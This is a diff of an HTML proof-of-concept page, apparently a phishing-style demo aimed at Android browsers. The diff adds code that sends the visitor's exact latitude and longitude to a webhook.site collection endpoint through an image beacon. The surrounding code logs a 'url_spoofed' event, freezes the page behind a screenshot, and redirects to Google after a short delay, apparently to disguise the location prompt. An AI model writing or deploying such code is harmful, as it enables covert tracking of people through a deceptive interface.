@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Android Geo Redirect Delay PoC</title>
+<title>Android Geo Final PoC</title>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 
@@ -23,20 +23,25 @@ button {
   background:#007aff;
   color:#fff;
 }
+#output {
+  margin-top:20px;
+  font-size:14px;
+}
 </style>
 </head>
 
 <body>
 
-<button id="start">Start Demo href</button>
+<button id="start">Start Demo nice</button>
+<p id="output">Location: -</p>
 
 <script>
-const TARGET = "https://google.com";
+const TARGET = "https://www.google.com";
 const LOG_ENDPOINT = "https://webhook.site/df32222f-b4a8-431a-872e-c4df63570c74";
 
 let triggered = false;
 
-// ===== LOGGER =====
+// ===== LOGGER (VERSI KAMU) =====
 function logEvent(type, extra = {}) {
   const data = {
     type,
@@ -51,7 +56,6 @@ function logEvent(type, extra = {}) {
 
   const params = new URLSearchParams(data).toString();
 
-  // penting: pakai backticks
   new Image().src = `${LOG_ENDPOINT}?${params}`;
 }
 
@@ -77,13 +81,33 @@ function freezeUI() {
   });
 }
 
-// ===== GEO =====
-function requestGeo() {
+// ===== GEO (VERSI KAMU) =====
+function getLocation() {
+  if (!navigator.geolocation) return;
+
   logEvent("geolocation_requested");
 
   navigator.geolocation.getCurrentPosition(
-    () => logEvent("geolocation_success"),
-    (err) => logEvent("geolocation_error", {code: err.code})
+    pos => {
+      logEvent("geolocation_success", {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude
+      });
+
+      // tetap log ke UI (kalau sempat sebelum freeze)
+      const out = document.getElementById("output");
+      if (out) {
+        out.textContent = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+      }
+    },
+    err => {
+      logEvent("geolocation_error", { code: err.code });
+
+      const out = document.getElementById("output");
+      if (out) {
+        out.textContent = 'Permission denied';
+      }
+    }
   );
 }
 
@@ -96,11 +120,14 @@ function delayedRedirect() {
 
   setTimeout(() => {
     logEvent("redirecting", {target: TARGET});
-location.href = TARGET;
-  }, 5000);
+
+    // 🔥 pakai href sesuai request kamu
+    location.href = TARGET;
+
+  }, 2800);
 }
 
-// ===== EVENTS =====
+// ===== DETECT BALIK =====
 document.addEventListener("visibilitychange", () => {
   if (document.visibilityState === "visible") {
     delayedRedirect();
@@ -123,7 +150,9 @@ document.getElementById("start").onclick = () => {
   logEvent("url_spoofed");
 
   freezeUI().then(()=>{
-    setTimeout(requestGeo, 100);
+    setTimeout(()=>{
+      getLocation(); // pakai versi kamu
+    },100);
   });
 };
 
